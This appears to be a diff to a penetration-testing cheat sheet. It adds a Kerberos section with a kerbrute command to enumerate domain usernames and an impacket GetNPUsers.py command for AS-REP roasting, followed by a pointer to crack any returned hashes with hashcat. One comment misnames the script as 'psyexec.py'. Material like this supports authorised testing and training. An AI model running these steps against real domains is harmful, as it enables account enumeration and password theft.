@@ -326,6 +326,21 @@ use auxiliary/scanner/ssl/openssl_heartbleed
 nmap -Pn -sV -p $port --script="banner,krb5-enum-users" -oN "tcp_port_kerberos_nmap.txt" $ip
 ```
 
+**kerbrute**
+```text
+# Enumerate usernames (using a crafted list, perhaps?)
+./kerbrute userenum --dc <DC_IP> -d <DOMAIN.LOCAL> <USERS_LIST>
+```
+
+**got a valid username?**
+```text
+# Use impacket psyexec.py to attempt to list and get TGTs for those users that have the property
+# 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).
+python3 GetNPUsers.py <DOMAIN.LOCAL>/<USERNAME>
+
+# If hash is returned, use hashcat to crack
+```
+
 ### POP3/POP3S (110/tcp, 995/tcp)
 
 ```text
